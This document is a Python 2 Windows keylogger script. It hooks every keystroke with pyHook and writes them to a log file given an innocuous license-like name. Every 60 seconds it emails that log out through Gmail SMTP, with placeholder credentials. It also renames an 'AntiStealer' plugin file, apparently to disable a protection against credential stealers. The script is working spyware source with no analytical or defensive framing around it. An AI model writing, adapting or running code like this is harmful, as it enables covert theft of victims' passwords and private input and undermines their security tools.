import pyHook, pythoncom, sys, logging, smtplib, threading, time, os
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
os.rename('!0AntiStealerByDarkP1xel32.ASI','!0AntiStealerByDarkP1xel32.ASl')
file_log = 'samplicense037.txt'
#=======================TIMER=========================
import time, traceback

def every(delay, task):
  next_time = time.time() + delay
  while True:
    time.sleep(max(0, next_time - time.time()))
    try:
      task()
    except Exception:
      traceback.print_exc()
    next_time += (time.time() - next_time) // delay * delay + delay
#====================EMAIL============================
def SendEmail():
    s = smtplib.SMTP('smtp.gmail.com', 587) 
    s.starttls() 
    s.login("your_email_here", "password_here")
    message = MIMEMultipart()
    message.attach(MIMEText(file("samplicense037.txt").read()))
    file("samplicense037.txt").close()
    s.sendmail("your_email_here", "your_email_here", message.as_string()) 
    s.quit()
threading.Thread(target=lambda: every(60, SendEmail)).start()    
#====================KEYLOGGER========================
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
#==========================END=========================



    
